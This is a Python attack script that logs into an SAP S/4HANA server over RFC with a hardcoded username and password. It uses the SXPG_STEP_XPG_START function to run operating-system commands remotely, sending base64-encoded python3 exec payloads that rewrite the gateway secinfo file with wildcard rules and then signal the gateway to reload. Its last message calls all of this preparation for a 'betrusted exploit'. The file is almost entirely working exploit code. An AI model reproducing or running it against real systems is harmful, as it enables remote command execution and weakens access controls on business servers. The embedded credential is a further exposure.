#!/usr/bin/env python3
"""Restore /usr/sap/S4H/SYS/global/secinfo to default, then SIGHUP GW."""
import sys, base64, time
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')
from sap_rfc_ctypes import RFCConnection

SDK = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'
BASE = dict(TARGET='', DESTINATION='', STDINCNTL='R', STDOUTCNTL='M',
            STDERRCNTL='M', TRACECNTL='0', TERMCNTL='C', TRACELEVEL='0',
            LONG_PARAMS='', CONNCNTL='H')

def sxpg(conn, prog, params, label=''):
    if label: print(f"[CMD] {label}")
    kw = dict(BASE, EXTPROG=prog, PARAMS=params)
    try:
        try: r = conn.call('SXPG_STEP_XPG_START', MXROW=9999, **kw)
        except Exception as e:
            if 'MXROW' in str(e) or 'RFC_INVALID' in str(e):
                r = conn.call('SXPG_STEP_XPG_START', **kw)
            else: print(f'  ERROR: {e}'); return
    except Exception as e:
        print(f'  ERROR: {e}'); return
    for row in r.get('LOG', []):
        line = (row.get('MESSAGE') or row.get('LINE') or row.get('TEXT') or '') if isinstance(row, dict) else str(row)
        if line.rstrip(): print(f'  {line.rstrip()}')

def py_exec(conn, code: str, label: str = ''):
    b64 = base64.b64encode(code.encode()).decode()
    params = f"-c exec(__import__('base64').b64decode('{b64}').decode())"
    if len(params) > 250:
        print(f"  [WARN] params len={len(params)}, may be truncated")
    sxpg(conn, '/usr/bin/python3', params, label)

SECINFO_PATH = '/usr/sap/S4H/SYS/global/secinfo'

with RFCConnection(sdk_path=SDK, ashost='192.168.2.209', sysnr='00',
                   client='001', user='joris', passwd='Schaap123!', lang='EN') as conn:
    print('[+] RFC connected\n')

    # Show current content
    sxpg(conn, '/usr/bin/cat', SECINFO_PATH, 'Current secinfo')

    # Write default secinfo in four short calls (each fits in PARAMS limit)
    py_exec(conn, f"open('{SECINFO_PATH}','w').write('#VERSION=2\\n')",
            'Write #VERSION=2 header')

    py_exec(conn, f"open('{SECINFO_PATH}','a').write('P USER=* USER-HOST=local HOST=local TP=*\\n')",
            'Append HOST=local rule')

    py_exec(conn, f"open('{SECINFO_PATH}','a').write('P USER=* USER-HOST=local HOST=internal TP=*\\n')",
            'Append HOST=internal rule')

    py_exec(conn, f"open('{SECINFO_PATH}','a').write('P USER=* USER-HOST=internal HOST=local TP=*\\n')",
            'Append USER-HOST=internal rule')

    # Verify
    sxpg(conn, '/usr/bin/cat', SECINFO_PATH, 'Verify restored secinfo')

    # SIGHUP to reload
    print('\n[*] Sending SIGHUP to gwrd to reload secinfo...')
    sxpg(conn, '/usr/bin/pkill', '-HUP -f gwrd', 'SIGHUP gwrd')
    print('[*] Done — GW will reload. Wait ~5s before running betrusted exploit.')
